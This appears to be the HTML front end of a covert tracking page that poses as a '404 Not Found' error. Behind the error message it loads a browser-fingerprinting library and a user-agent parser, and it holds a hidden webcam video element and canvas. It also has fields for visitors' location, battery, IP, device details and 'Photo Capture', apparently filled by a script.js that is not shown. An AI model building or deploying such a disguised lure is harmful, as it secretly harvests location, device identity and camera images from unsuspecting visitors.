<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>404 Not Found</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.4/dist/fingerprint2.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>404</h1>
    <p>Oops! The page you're looking for doesn't exist.</p>
    <a href="/">Go back home</a>
    
    <div class="info" id="device-info">
      <h3>Device Information:</h3>
      <div id="location-info">Location: Loading...</div>
      <a id="map-link" target="_blank" style="display:none;">View on Maps</a>
      <div id="battery-info">Battery: Loading...</div>
      <div id="camera-info">Camera: Checking...</div>
      <div id="ip-info">IP: Loading...</div>
      <div id="device-details">Device Details: Loading...</div>
      <div id="photo-status">Photo Capture: Waiting...</div>
    </div>
  </div>

  <video id="webcam" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="script.js"></script>
</body>
</html>
